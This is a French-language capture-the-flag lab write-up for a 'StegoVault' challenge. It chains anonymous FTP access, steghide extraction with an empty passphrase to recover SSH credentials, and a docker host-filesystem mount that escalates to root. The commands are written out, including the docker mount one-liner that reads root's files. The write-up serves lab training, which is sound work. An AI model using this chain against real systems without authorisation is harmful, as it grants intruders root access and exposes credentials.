---
doc_kind: writeup
title: "ThunderCipher StegoVault - FTP anonyme, steghide passphrase vide puis GTFOBins docker"
category: forensics
slug: stegovault-ftp-steghide-empty-pass-docker
created: 2026-10-29
status: solved
tags:
  - steghide-empty-passphrase
  - ftp-anonymous
  - gtfobins-docker
  - mount-escape
source: thundercipher.in/labs
target: "JPEG steganographie + sudo docker"
---
# ThunderCipher StegoVault - FTP anonyme, steghide passphrase vide puis GTFOBins docker

## Challenge Summary

- Source: thundercipher.in/labs
- Target: JPEG steganographie + sudo docker
- Goal: Un FTP anonyme expose un JPEG contenant des donnees stegano extractibles avec une passphrase steghide vide, revelant des creds SSH; sudo NOPASSWD docker permet un montage complet du disque.

## Initial Signals

- Entry point: see Exploit Chain step 1
- Visible hints: n/a (see source writeup)
- First confirming probe: see Exploit Chain

## Exploit Chain

1. FTP anonyme -> recuperation d'un JPEG.
2. steghide extract -sf <image> -p '' -> fichier de creds (passphrase vide, premier reflexe).
3. ssh avec les creds extraites -> flag user direct.
4. sudo -l -> NOPASSWD /usr/bin/docker.
5. docker run -v /:/mnt --rm <image> cat /mnt/root/root.txt -> flag root.

## Key Evidence

- Extraction reussie avec passphrase vide confirmee par la sortie de steghide; flag lu via montage docker.

## Dead Ends

- n/a (see Reusable Lessons)

## Payloads And Commands

```text
steghide extract -sf <image> -p ''; docker run -v /:/mnt --rm <image> cat /mnt/root/root.txt.
```

## Flag / Outcome

- Flag obtenu, chaine confirmee de bout en bout.

## Reusable Lessons

- Toujours tester steghide extract -p '' (passphrase vide) en premier reflexe sur tout JPEG suspect; sudo docker NOPASSWD = root trivial via montage -v /:/mnt.

## Pattern Candidates

- Voir pattern associe de meme slug.
